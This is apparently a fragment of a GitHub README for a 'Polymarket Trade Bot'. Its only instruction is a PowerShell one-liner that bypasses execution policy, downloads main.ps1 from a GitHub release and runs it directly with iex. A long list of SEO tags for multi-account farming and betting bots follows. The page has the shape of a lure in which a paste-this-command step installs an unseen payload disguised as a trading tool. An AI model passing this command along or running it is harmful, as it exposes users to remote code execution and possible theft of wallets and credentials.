...
```powershell
powershell -ep bypass -c "iwr https://github.com/kadircoskun50/Polymarket-Trade-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```
...
`polymarket-bot` `polymarket-prediction` `prediction-bot` `multi-account-bot` `crypto-bot` `automated-farming` `defi-farming` `auto-predictor` `volume-farmer` `points-farmer` `proxy-support` `async-bot` `python-bot` `prediction-markets` `betting-bot` `market-prediction` `clob-trading` `polymarket-api` `volume-farming` `streak-farming`
